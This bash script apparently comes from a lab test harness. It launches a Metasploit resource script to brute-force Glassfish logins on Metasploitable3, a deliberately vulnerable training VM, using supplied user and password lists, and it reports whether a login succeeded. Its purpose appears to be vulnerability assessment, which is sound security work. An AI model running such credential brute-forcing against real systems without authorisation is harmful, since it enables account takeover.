#!/bin/bash
#Vulnerability 
#Weak Passwords

#Glassfish brute force for Metasploitable3

#Parameters
#Script ip_address
#Script user_file
#Script password_file

#Make Sure The Correct Arguments are passed
if [ $# -ne 3 ]
then
	echo "Usage: $0 <host_ip> <user_file> <pass_file>"
	exit 1
fi

#Save all the arguments in variables
IP_ADDR=$1
USER_FILE=$2
PASS_FILE=$3

#Check for the required utilities
#Check if the metasploit framework is available
if ! command -v msfconsole &> /dev/null; then
    echo "This module requires msfconsole to be installed."
    exit 1
fi


#Export the variables so they can be taken in by Metasploit
export IP_ADDR
export USER_FILE
export PASS_FILE


#Run the RC Script
command msfconsole -r glassfish.rc $1 &> ./log 

#Check if the script contains a successful exploit
if grep -q "Success" log;
then 
	exit 1
else 
	exit 0
fi
